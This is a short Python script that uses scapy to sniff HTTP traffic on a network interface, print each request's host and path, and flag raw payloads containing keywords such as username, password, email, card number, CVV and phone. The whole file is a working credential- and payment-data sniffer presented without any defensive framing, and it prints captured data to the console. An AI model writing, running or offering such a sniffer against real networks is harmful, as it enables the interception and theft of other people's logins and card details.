#!/usr/local/bin/python3

import os
import scapy.all as scapy
from scapy.layers import http
from scapy.layers import inet


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    # Filter: arp, tcp, udp, port 22...


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_sensitive_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = [
            "username",
            "user",
            "password",
            "pass",
            "email",
            "cvc",
            "cvv",
            "card",
            "ccname",
            "cardnumber",
            "cc-exp",
            "name",
            "phone"
        ]
        for kwd in keywords:
            if kwd in load:
                return load
        return False


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] " + packet[http.HTTPRequest].Method + " " + url)

        print(packet.summary())
        # print(packet.show())
        # print(packet[inet.Ether])
        # print(packet[Ethernet].src + packet[Ethernet].dst)

        sensitive_info = get_sensitive_info(packet)
        if sensitive_info:
            print("\n\n[+] Possible sensitive information: " + sensitive_info + "\n\n")

# Launch script
os.system('clear')
print("[+] Sniffing packets...")
sniff("en0")
